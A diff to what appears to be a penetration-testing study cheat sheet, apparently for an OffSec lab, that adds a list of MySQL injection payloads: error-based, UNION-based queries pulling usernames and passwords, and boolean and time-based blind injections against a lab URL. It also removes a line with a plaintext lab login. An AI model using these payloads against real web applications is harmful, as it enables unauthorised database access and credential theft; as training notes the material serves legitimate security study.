@@ -731,13 +731,33 @@ show databases;
 SELECT user, authentication_string FROM mysql.user WHERE user = 'offsec';
 ```
 
-### mssql
+### mysql sqli
 ```bash
-impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth
-SELECT @@version;
-SELECT name FROM sys.databases;
-SELECT * FROM offsec.information_schema.tables;
+#Error-based Payloads
+offsec' OR 1=1 -- //
+' or 1=1 in (select @@version) -- //
+' OR 1=1 in (SELECT * FROM users) -- //
+' or 1=1 in (SELECT password FROM users) -- //
+' or 1=1 in (SELECT password FROM users WHERE username = 'admin') -- //
+
+#UNION-based payloads
+' ORDER BY 1-- //
+%' UNION SELECT database(), user(), @@version, null, null -- //
+' UNION SELECT null, null, database(), user(), @@version  -- //
+' union select null, table_name, column_name, table_schema, null from information_schema.columns where table_schema=database() -- //
+' UNION SELECT null, username, password, description, null FROM users -- //
+
+#Blind SQL Injections
+#boolean-based SQLi
+http://192.168.50.16/blindsqli.php?user=offsec' AND 1=1 -- //
+#time-based SQLi
+http://192.168.50.16/blindsqli.php?user=offsec' AND IF (1=1, sleep(3),'false') -- //
+
+
 ```
+
+
+
 
 ### mssql
 ```bash
